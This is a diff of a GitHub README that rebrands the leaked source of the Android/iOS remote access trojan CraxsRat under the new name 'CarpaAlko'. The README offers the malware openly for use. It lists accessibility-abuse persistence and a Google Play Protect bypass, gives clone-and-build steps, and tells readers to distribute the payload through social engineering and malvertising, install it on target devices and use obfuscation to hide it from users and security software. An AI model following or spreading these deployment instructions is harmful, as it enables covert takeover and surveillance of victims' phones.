@@ -1,4 +1,4 @@
-# CraxsRat
+# CarpaAlko
 
 ```shell
          ____
@@ -9,8 +9,8 @@
       .<     __0   
      /\ \.-.' \         …ᘛ⁐̤ᕐᐷ___X
     J  `.|`.\/ \   
-    | |_.|  | | |  CraxsRat - Broken trust
-     \__.'`.|-' /        Could be v7
+    | |_.|  | | |  CarpaAlko - Broken trust
+     \__.'`.|-' /       Remote Access
      L   /|o`--'\ 
      |  /\/\/\   \           
      J /      `.__\
@@ -20,7 +20,7 @@
    (___._/  \_.___) `-/
 ```
 
-## CraxsRat Source Code
+## CarpaAlko Source Code
 
 This repository contains the leaked source code of CraxsRat, a sophisticated Android && iOS remote access trojan ( **RAT** ) developed by "EVLF DEV". CraxsRat has been used in various cyber-attacks to grant cybercriminals extensive control over infected devices.
 
@@ -38,10 +38,11 @@ This repository contains the leaked source code of CraxsRat, a sophisticated And
 - **Accessibility Exploitation**: Modify the accessibility settings page to maintain persistence.
 - **Google Play Protect Bypass**: The latest version, v7.4, can bypass Google’s built-in antivirus system, Google Play Protect.
 
-## Installation
 # Directory Descriptions
 
-## Directories
+<details>
+<summary><h4>Directories</h4></summary>
+
 1. **.vs**
    - Visual Studio project settings and configuration files.
 
@@ -132,18 +133,21 @@ This repository contains the leaked source code of CraxsRat, a sophisticated And
 
 25. **Template.xaml**
     - Defines a XAML template, potentially for UI components or styles.
-### Requirements
+
+</div></details>
+
+## Requirements
 
 - Android && iOS device ( target )
 - Builder application to create the RAT payload
 
-### Setup
+## Setup
 
 1. **Clone the Repository**:
    ```sh
-   git clone https://github.com/pxcs/CraxsRat.git
-   cd CraxsRat
-   cd craxsrat_v7
+   git clone https://github.com/byt3n33dl3/CarpaAlko.git
+   cd CarpaAlko
+   cd CarpaAlko_v7
    ```
 
 2. **Open it with vs & Builder Configuration**:
@@ -155,7 +159,7 @@ This repository contains the leaked source code of CraxsRat, a sophisticated And
    - Distribute the RAT payload through social engineering, malvertising, or other methods.
    - Ensure the payload is installed on the target device.
 
-## Usage
+# Usage
 
 1. **Control the Infected Device**:
    - Use the command and control (C2) server to send commands to the infected device.
@@ -165,14 +169,14 @@ This repository contains the leaked source code of CraxsRat, a sophisticated And
    - Utilize the obfuscation features to keep the RAT hidden from the user and security software.
    - Ensure the RAT's accessibility settings are enabled to maintain control over the device.
 
-## Remote access
+# Remote access
 ```shell
        __             ___
       // )    ___--""    "-.
  \ |,"( /`--""              `.   K A R Y A A N A K B A N G S A
-  \/ o                        \     CraxsRat - trust attack
+  \/ o                        \     CarpaAlko - trust attack
   (   _.-.              ,'"    ;  
-   |\"   /`. \  ,      /       |      by: pxcs && maxamin
+   |\"   /`. \  ,      /       |   by: byt3n33dl3 && maxamin
    | \  ' .'`.; |      |       \.______________________________
      _-'.'    | |--..,,,\_    \________------------""""""""""""
     '''"   _-'.'       ___"-   )
